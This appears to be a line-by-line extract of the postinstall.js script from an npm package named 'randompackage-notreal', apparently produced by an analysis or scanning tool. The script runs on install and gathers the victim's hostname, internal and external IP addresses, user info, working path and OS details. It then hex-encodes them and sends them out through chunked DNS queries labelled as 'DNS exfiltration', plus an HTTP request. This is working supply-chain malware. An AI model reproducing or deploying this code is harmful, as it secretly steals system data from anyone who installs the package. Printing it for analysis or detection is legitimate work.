// File: tmp/tmpsub_irgm/randompackage-notreal/package/postinstall.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const dns = require('dns')
Line 3: const http = require('http')
Line 4: const https = require('https')
Line 5: const os = require('os')
Line 13: os.hostname()
Line 16: const internalIpAddress = require('child_process').execSync('hostname -I').toString().trim()
Line 18: os.platform()
Line 19: os.userInfo()
Line 23: os.platform()
Line 25: os.arch()
Line 29: (_tmp_4 = https.get('https://api.ipify.org?format=json', (res) => {
    let data = '';

    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      const externalIp = JSON.parse(data).ip;
      callback(null, externalIp);
    });

  }))
Line 37: const externalIp = JSON.parse(data).ip
Line 38: callback(null, externalIp)
Line 42: callback(err)
Line 46: {
  if (err) {
    fs.appendFileSync(logFile, `Error fetching external IP address: ${err.message}\n`);
    return;
  }

  const data = {
    packageName,
    packageVersion,
    hostname,
    internalIpAddress,
    externalIpAddress,
    currentPath,
    platform,
    userInfo,
    osDetails // Added OS details here
  };

  fs.appendFileSync(logFile, `Data: ${JSON.stringify(data)}\n`);

  // Prepare data for DNS exfiltration
  const dnsData = `${packageName}-${hostname}-${externalIpAddress}`;
  const hexData = Buffer.from(dnsData).toString('hex');

  // Split hex data into parts fitting within DNS label length limit
  const maxLabelLength = 63;
  const hexDataParts = [];
  for (let i = 0; i < hexData.length; i += maxLabelLength) {
    hexDataParts.push(hexData.substring(i, i + maxLabelLength));
  }

  // Send each part as a separate DNS query
  hexDataParts.forEach((part, index, arr) => {
    const partIndex = index + 1;
    const totalParts = arr.length;
    const dnsSubdomain = `$...
Line 68: Buffer.from(dnsData).toString('hex')
Line 72: const hexDataParts = []
Line 74: hexDataParts.push(hexData.substring(i, i + maxLabelLength))
Line 82: dns.resolve4(dnsSubdomain, (err, addresses) => {
      if (err) {
        fs.appendFileSync(logFile, `DNS resolution failed: ${err}\n`);
      } else {
        fs.appendFileSync(logFile, `DNS query sent for ${dnsSubdomain}\n`);
      }
    })
Line 101: const req = http.request(options, (res) => {
    let responseData = '';
    res.on('data', (chunk) => {
      responseData += chunk;
    });
    res.on('end', () => {
      fs.appendFileSync(logFile, `HTTP request completed with status ${res.statusCode}: ${responseData}\n`);
    });
  })
Line 115: req.end()
